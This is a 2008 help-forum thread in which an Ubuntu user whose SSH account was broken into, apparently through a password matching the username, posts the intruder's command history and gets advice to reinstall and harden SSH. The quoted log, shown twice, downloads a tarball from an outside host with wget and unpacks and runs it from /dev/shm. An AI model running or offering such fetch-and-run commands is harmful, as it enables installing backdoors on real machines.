---
title: "help, one person enter in my pc"
date: 2008-02-06
forum: General Help
---

### Post by budg4 on 2008-02-06
i use ubuntu 7.10, and one person enter in my PC, i saw this becausue he change my password. i think he enter on the pc because my password was the same as the username! and SSHD is instaled,

he have used this command:

w
cd /dev/shm
ls -a
ps x
 wget bazilutzu.ueuo.com/usa.tar
tar -xzvf usa.tar
cd halfop
cd inst
pico inst
chmod +x *
./start uzer
last -100
w
cd /home
ls -a
passwd
cat /proc/cpuinfo
uname -a


did you think he instaled me a rootkit or other malware software?

many thanks for any help.

---

### Post by jken146 on 2008-02-06
It's possible that he did any unknown amount of damage.
You really should assume the worst and wipe your hard drive and reinstall from scratch.

Next time, pick a strong password!

---

### Post by SOULRiDER on 2008-02-06
> **jken146 said:**
> It's possible that he did any unknown amount of damage.
You really should assume the worst and wipe your hard drive and reinstall from scratch.

Next time, pick a strong password!

+1

I suggest you wipe and use a strong complicated password next time.

---

### Post by johnnyb1726 on 2008-02-06
I would recommend using a stronger password.  If you want to check if your password is strong try this site.
[http://www.securitystats.com/tools/password.php]("http://www.securitystats.com/tools/password.php")

---

### Post by notwen on 2008-02-06
If someone gained unauthorized access to your machine remotely, then you would be better off saving any files you need and formatting/re-installing.  There is no telling how long they've had access and whether or not they've done stuff to your PC prior to you catching this one instance.  I recommend re-installing. =]

---

### Post by TheBoat on 2008-02-06
If you don't reinstall Ubuntu on your box, you could continue to see even more hazardous problems later.

---

### Post by pointone on 2008-02-06
Looking through the file, it seems it installs a new version of bash on your system and sets up some sort of server information. My guess is the new bash is a keylogger and sends your keystrokes to these servers.

+1 for reinstall.

Be careful what you type until you've reinstalled.

---

### Post by upthelum on 2008-02-06
> **budg4 said:**
> i use ubuntu 7.10, and one person enter in my PC, i saw this becausue he change my password. i think he enter on the pc because my password was the same as the username! and SSHD is instaled,

he have used this command:

w
cd /dev/shm
ls -a
ps x
 wget bazilutzu.ueuo.com/usa.tar
tar -xzvf usa.tar
cd halfop
cd inst
pico inst
chmod +x *
./start uzer
last -100
w
cd /home
ls -a
passwd
cat /proc/cpuinfo
uname -a


did you think he instaled me a rootkit or other malware software?

many thanks for any help.

Seems unanimous. It's the old cliche of putting it down to experience then...

---

### Post by bodhi.zazen on 2008-02-06
I would add, if you run a ssh server, learn to secure it.

[uwiki]AdvancedOpenSSH[/uwiki]

---

